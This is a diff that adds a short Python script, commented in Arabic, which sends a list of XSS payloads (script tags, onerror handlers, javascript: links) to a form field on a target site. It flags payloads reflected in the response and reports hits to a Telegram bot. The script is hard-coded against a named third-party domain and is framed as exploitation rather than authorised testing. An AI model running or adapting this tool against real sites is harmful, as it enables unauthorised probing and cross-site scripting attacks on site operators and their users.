@@ -1,0 +1,57 @@
+import requests
+
+# قائمة موسعة من payloads المعروفة لاستغلال ثغرات XSS
+payloads = [
+    "<script>alert('XSS1')</script>",
+    "<img src=x onerror=alert('XSS2')>",
+    "<svg><script>alert('XSS3')</script></svg>",
+    "<iframe src='javascript:alert(\"XSS4\")'></iframe>",
+    "<body onload=alert('XSS5')>",
+    "<input type='image' src='x' onerror='alert(1)'>",
+    "<a href='javascript:alert(2)'>Click me</a>",
+    "<marquee onstart='alert(3)'>Test</marquee>"
+]
+
+# توكن البوت ومعرف الدردشة
+TELEGRAM_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN'  # استبدله بالتوكن الخاص بك
+CHAT_ID = 'YOUR_CHAT_ID'  # استبدله بمعرف الدردشة الخاص بك
+
+def send_telegram_message(message):
+    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
+    data = {
+        'chat_id': CHAT_ID,
+        'text': message
+    }
+    try:
+        requests.post(url, data=data)
+    except Exception as e:
+        print(f"Error sending message to Telegram: {e}")
+
+def exploit_xss(url, method='POST'):
+    for payload in payloads:
+        # تجهيز الطلب
+        data = {
+            'inputField': payload  # يجب تعديل اسم الحقل حسب التطبيق المستهدف
+        }
+        
+        try:
+            if method.upper() == 'POST':
+                response = requests.post(url, data=data)
+            else:
+                response = requests.get(url, params=data)
+
+            # التحقق من استجابة السيرفر
+            if payload in response.text:
+                message = f"XSS vulnerability found with payload: {payload} on {url}"
+                print(message)
+                send_telegram_message(message)
+            else:
+                print(f"No vulnerability found for payload: {payload}")
+        
+        except Exception as e:
+            print(f"Error occurred: {e}")
+
+# مثال على الاستخدام
+if __name__ == "__main__":
+    target_url = "https://www.chatliyily.com"  # استبدل هذا بالرابط الصحيح
+    exploit_xss(target_url, method='POST')  # يمكنك تغيير 'POST' إلى 'GET' إذا كان ذلك مناسبًا
